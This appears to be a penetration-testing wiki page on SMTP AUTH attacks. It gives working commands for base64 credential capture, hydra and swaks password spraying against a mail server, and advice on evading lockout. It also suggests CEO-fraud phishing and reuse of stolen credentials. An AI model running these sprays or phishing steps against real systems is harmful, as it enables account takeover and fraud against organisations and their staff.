---
title: "Authentication: SMTP AUTH spraying and cleartext capture"
description: "SMTP submission advertises AUTH mechanisms (LOGIN, PLAIN, CRAM-MD5) in its EHLO reply. PLAIN and LOGIN carry base64-encoded credentials that are trivially sniffable without TLS and sprayable online, and a valid credential yields authenticated relay and mailbox access as a real employee."
keywords:
  - smtp auth
  - AUTH PLAIN
  - AUTH LOGIN
  - password spraying
  - hydra smtp
---

# Authentication

The submission service authenticates clients with the ESMTP `AUTH` command, and the mechanisms it will accept are listed in the EHLO reply (`250-AUTH LOGIN PLAIN CRAM-MD5`). Two of those mechanisms matter most to an attacker. `AUTH PLAIN` takes a single base64 token of `\0username\0password`, so the credential travels in one line and is recovered by a base64 decode. `AUTH LOGIN` is the same idea in two steps: base64 username, then base64 password. Neither is encryption; on port 25 or 587 before STARTTLS the credential is effectively cleartext on the wire. The server answers `235` on success and `535` on failure, a clean oracle for online guessing. A working SMTP credential is a real directory account in most deployments, so it is reusable far beyond mail.

## Preconditions

- EHLO advertises `AUTH`. If it only appears after STARTTLS, run `STARTTLS` first (many servers hide AUTH until the channel is encrypted).
- Prefer 587 (submission) or 465 (implicit TLS); 25 may not offer AUTH at all.
- A validated user list from [user enumeration](user-enumeration.md) so sprays land on real accounts.

## Building and sending AUTH by hand

```bash
# AUTH PLAIN token is base64 of NUL user NUL pass
printf '\0jsmith\0Spring2026!' | base64
#   AGpzbWl0aABTcHJpbmcyMDI2IQ==
```
```text
EHLO attacker.test
250-AUTH LOGIN PLAIN
AUTH PLAIN AGpzbWl0aABTcHJpbmcyMDI2IQ==
235 2.7.0 Authentication successful        # 235 = valid credential
# wrong password:
535 5.7.8 Error: authentication failed     # 535 = rejected
```
`235` is a live credential; `535` is a miss. Reading a captured `AUTH PLAIN` line off the wire is the reverse: `echo AGpzbWl0aABTcHJpbmcyMDI2IQ== | base64 -d | tr '\0' ':'` prints `:jsmith:Spring2026!`.

## Spraying

```bash
# one password across the validated user list, submission port
hydra -L users.txt -p 'Spring2026!' -s 587 mail.victim.com smtp
# swaks to test a single pair and watch the full dialogue
swaks --server mail.victim.com:587 --auth LOGIN --auth-user jsmith --auth-password 'Spring2026!' --tls
```
Hydra prints `[587][smtp] host: ... login: jsmith password: Spring2026!` only on a `235`. Keep the password count low per round: submission services log auth failures and lock accounts, and in an Entra-backed org a burst triggers smart lockout.

## Follow-on

- Authenticated relay: once logged in, the server sends as your account's domain with full authorization, so the mail passes SPF/DKIM/DMARC and lands as a genuine internal sender. This is the clean path to CEO-fraud phishing without needing an [open relay](open-relay.md).
- The same credential typically unlocks the mailbox over IMAP/POP/OWA and the wider directory; spray it against other services immediately.
- For Microsoft 365, legacy SMTP AUTH is often disabled; spray the identity platform instead, see [Entra ID password spraying](../../../../../online/identity/entra-id/authentication/password-spraying.md).

## Tools

- [hydra](https://github.com/vanhauser-thc/thc-hydra)
- [swaks](https://github.com/jetmore/swaks)

## References

- [RFC 4954 (SMTP Service Extension for Authentication)](https://datatracker.ietf.org/doc/html/rfc4954)
- [RFC 4616 (the PLAIN SASL mechanism)](https://datatracker.ietf.org/doc/html/rfc4616)
- [HackTricks: SMTP (25,465,587)](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html)
